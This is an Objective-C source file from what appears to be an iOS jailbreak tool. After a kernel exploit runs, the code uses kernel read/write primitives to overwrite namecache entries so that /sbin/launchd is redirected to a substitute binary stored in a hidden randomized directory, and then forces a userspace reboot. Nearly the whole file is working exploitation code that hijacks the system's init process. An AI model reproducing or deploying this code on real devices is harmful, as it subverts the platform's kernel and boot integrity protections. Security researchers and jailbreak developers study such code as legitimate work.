#import <Foundation/Foundation.h>
#import "haxx.h"
#import "krw.h"
#import "offsets.h"
#import "vnode.h"
#import "userspace_reboot.h"

int SwitchSysBin(uint64_t vnode, char* what, char* with)
{
    printf("[+] SwitchSysBin(0x%llx, %s, %s)\n", vnode, what, with);
    uint64_t vp_nameptr = kread64(vnode + off_vnode_v_name);
    uint64_t vp_namecache = kread64(vnode + off_vnode_v_ncchildren_tqh_first);
    if(vp_namecache == 0)
        return 0;

    printf("[+] vp_namecache: 0x%llx\n", vp_namecache);

    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf(kread64(vp_namecache + 96), &vp_name, 256);
        printf("[!] vp_name: %s\n", vp_name);
        
        if(strcmp(vp_name, what) == 0)
        {
            uint64_t with_vnd = getVnodeAtPath(with);
            printf("[+] with_vnd: 0x%llx\n", with_vnd);
            uint32_t with_vnd_id = kread64(with_vnd + 116);
            printf("[+] with_vnd_id: 0x%x\n", with_vnd_id);
            uint64_t patient = kread64(vp_namecache + 80);        // vnode the name refers
            printf("[!] patient: %llx\n", patient);
            uint32_t patient_vid = kread64(vp_namecache + 64);    // name vnode id
            printf("[!] patient: %llx vid:%llx -> %llx\n", patient, patient_vid, with_vnd_id);
            kwrite64(vp_namecache + 80, with_vnd);
            kwrite32(vp_namecache + 64, with_vnd_id);
            
            return vnode;
        }
        vp_namecache = kread64(vp_namecache + off_namecache_nc_child_tqe_prev);
    }
    return 0;
}

#define JB_ROOT_PREFIX ".jbroot-"
#define JB_RAND_LENGTH  (sizeof(uint64_t)*sizeof(char)*2)

int is_jbrand_value(uint64_t value)
{
   uint8_t check = value>>8 ^ value >> 16 ^ value>>24 ^ value>>32 ^ value>>40 ^ value>>48 ^ value>>56;
   return check == (uint8_t)value;
}

int is_jbroot_name(const char* name)
{
    if(strlen(name) != (sizeof(JB_ROOT_PREFIX)-1+JB_RAND_LENGTH))
        return 0;

    if(strncmp(name, JB_ROOT_PREFIX, sizeof(JB_ROOT_PREFIX)-1) != 0)
        return 0;

    char* endp=NULL;
    uint64_t value = strtoull(name+sizeof(JB_ROOT_PREFIX)-1, &endp, 16);
    if(!endp || *endp!='\0')
        return 0;

    if(!is_jbrand_value(value))
        return 0;

    return 1;
}

uint64_t resolve_jbrand_value(const char* name)
{
    if(strlen(name) != (sizeof(JB_ROOT_PREFIX)-1+JB_RAND_LENGTH))
        return 0;

    if(strncmp(name, JB_ROOT_PREFIX, sizeof(JB_ROOT_PREFIX)-1) != 0)
        return 0;

    char* endp=NULL;
    uint64_t value = strtoull(name+sizeof(JB_ROOT_PREFIX)-1, &endp, 16);
    if(!endp || *endp!='\0')
        return 0;

    if(!is_jbrand_value(value))
        return 0;

    return value;
}


NSString* find_jbroot()
{
    //jbroot path may change when re-randomize it
    NSString * jbroot = nil;
    NSArray *subItems = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/Application/" error:nil];
    for (NSString *subItem in subItems) {
        if (is_jbroot_name(subItem.UTF8String))
        {
            NSString* path = [@"/var/containers/Bundle/Application/" stringByAppendingPathComponent:subItem];
            jbroot = path;
            break;
        }
    }
    return jbroot;
}

NSString *jbroot(NSString *path)
{
    NSString* jbroot = find_jbroot();
    return [jbroot stringByAppendingPathComponent:path];
}

int check_setup(void) {
    printf("[+] check_setup\n");
    printf("[+] jbroot: %s\n", find_jbroot().UTF8String);
    //int fd = open("/var/jb/launchdmineek", O_RDONLY);
    int fd = open(jbroot(@"launchdmineek").UTF8String, O_RDONLY);
    if(fd < 0)
        return 1;
    close(fd);
    return 0;
}

int setup(void);

void launchd_haxx(void) {
    printf("[+] launchd_haxx\n");
    _offsets_init();
    printf("[+] offsets initialized\n");
    int need_setup = check_setup();
    printf("[+] need_setup: %d\n", need_setup);
    //if(need_setup)
    if(1)
        setup();
    printf("[+] setup done\n");
    SwitchSysBin(getVnodeAtPathByChdir("/sbin"), "launchd", jbroot(@"launchdmineek").UTF8String);
}

void do_all(int exploit_method) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        kopen_wrapper(exploit_method);
        setup();
        if (is_exploited()) {
            printf("[+] launching launchd haxx\n");
            launchd_haxx();
        } else {
            printf("[-] kernel failed to exploit\n");
        }
        userspaceReboot();
    });
}
